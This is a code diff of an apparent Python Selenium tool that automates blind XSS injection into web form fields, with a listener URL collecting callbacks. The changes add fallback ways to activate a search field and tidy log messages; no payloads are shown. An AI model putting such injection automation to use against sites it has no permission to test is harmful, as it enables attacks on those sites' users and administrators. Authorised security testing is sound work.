@@ -33,7 +33,7 @@ def find_tags(html_content, tags):
 def get_rendered_html(url):
     """Captura HTML após renderização do JavaScript."""
     chrome_options = Options()
-    chrome_options.add_argument("--headless")  
+    #chrome_options.add_argument("--headless")  
     driver = webdriver.Chrome(options=chrome_options)
 
     try:
@@ -355,26 +355,62 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                     # Tratamento especial apenas para mat-input-1 (já foi validado pelo eco_test)
                     if element.get('id') == 'mat-input-1':
                         try:
-                            # Força a ativação da barra de pesquisa ANTES de tentar encontrar o elemento
+                            # USA A MESMA LÓGICA ROBUSTA DO get_rendered_html para encontrar a lupa
+                            search_icon = None
+                            
+                            # Estratégia 1: mat-icon com classe mat-search_icon-search 
                             try:
-                                search_icon = driver.find_element(By.XPATH, "//mat-icon[text()='search']")
-                                search_icon.click()
-                                time.sleep(1)
+                                search_icon = WebDriverWait(driver, 3).until(
+                                    EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-icon[class*='mat-search_icon-search']"))
+                                )
                             except:
                                 pass
+                            
+                            # Estratégia 2: mat-icon que contém texto "search" 
+                            if not search_icon:
+                                try:
+                                    search_icon = WebDriverWait(driver, 3).until(
+                                        EC.element_to_be_clickable((By.XPATH, "//mat-icon[contains(text(), 'search')]"))
+                                    )
+                                except:
+                                    pass
+                            
+                            # Estratégia 3: qualquer mat-icon na barra superior (toolbar)
+                            if not search_icon:
+                                try:
+                                    search_icon = WebDriverWait(driver, 3).until(
+                                        EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-toolbar mat-icon"))
+                                    )
+                                except:
+                                    pass
+                            
+                            # Estratégia 4: busca por data-mat-icon-type="font"
+                            if not search_icon:
+                                try:
+                                    search_icon = WebDriverWait(driver, 3).until(
+                                        EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-icon[data-mat-icon-type='font']"))
+                                    )
+                                except:
+                                    pass
+                            
+                            # Se encontrou, clica e aguarda
+                            if search_icon:
+                                search_icon.click()
+                                time.sleep(1)
+                            else:
+                                continue
                             
                             # Agora sim, aguarda até este campo ficar ativo (igual ao eco_test)
                             input_field = WebDriverWait(driver, 10).until(
                                 EC.element_to_be_clickable((By.ID, "mat-input-1"))
                             )
-                            
                             # Força o foco usando JavaScript
                             driver.execute_script("arguments[0].focus();", input_field)
                             driver.execute_script("arguments[0].click();", input_field)
                             time.sleep(0.5)
                             
                         except Exception as e:
-                            print(f"[!] Campo de busca mat-input-1 não pode ser ativado: {str(e)}")
+                            print(f"Campo de busca mat-input-1 não pode ser ativado: {str(e)}")
                             continue
                     else:
                         # Para outros campos, usa a mesma lógica do eco_test
@@ -397,7 +433,7 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                     
                     # Verifica se conseguiu encontrar/ativar o campo
                     if not input_field:
-                        print(f"[!] Não foi possível encontrar o campo {field_name}")
+                        print(f"Não foi possível encontrar o campo {field_name}")
                         continue
                     
                     # Injeção do payload blind XSS
@@ -428,7 +464,7 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                         'status': 'injected'
                     })
                     
-                    print(f"[+] Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
+                    print(f"Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
                     
                     # Volta para a página original se necessário (mesma lógica do eco_test)
                     try:
@@ -456,10 +492,10 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                                         except:
                                             pass
                     except Exception as nav_error:
-                        print(f"[!] Erro ao navegar de volta: {nav_error}")
+                        print(f"Erro ao navegar de volta: {nav_error}")
                     
                 except Exception as e:
-                    print(f"[!] Falha ao injetar payload no campo {field_name}: {e}")
+                    print(f"Falha ao injetar payload no campo {field_name}: {e}")
                     continue
 
     except Exception as e:
